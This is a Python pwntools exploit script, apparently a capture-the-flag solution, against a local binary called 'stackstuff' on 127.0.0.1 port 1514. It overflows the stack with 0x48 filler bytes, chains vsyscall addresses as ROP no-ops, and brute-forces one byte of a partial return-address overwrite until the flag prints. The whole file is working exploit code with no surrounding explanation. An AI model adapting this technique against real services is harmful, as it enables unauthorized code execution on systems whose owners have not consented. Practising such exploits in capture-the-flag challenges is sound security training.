from pwn import *

targetProcess = process('./stackstuff')
#gdb.attach(targetProcess)

# Initialize constants
flag = 0
i = 0x00

# Enter into the loop to brute force it
while flag == 0:

    # Establish the connection
    target = remote('127.0.0.1', 1514)

    # Filler from start of our input to return address
    payload = "0"*0x48

    # Our vsyscall gadget to act essentially as a rop nop
    vsyscall_ret = p64(0xffffffffff600800)

    payload += vsyscall_ret*2

    # Our least significant byte of our partial overwrite
    payload += "\x8b"

    # The byte which we will be brute forcing
    payload += chr(i)

    # Specify length of our input to be 90 bytes
    target.sendline('90')

    # Send the payload
    target.sendline(payload)

    target.recvuntil("Length of password: ")
    try:
        # Executes if we got the flag
        print "flag: " + target.recvline()
        flag = 1
    except:
        # Didn't get the flag, try next byte
        # Also we know that the lower 4 bits of this byte is 0x0
        print "tried: " + hex(i)
        i += 0x10
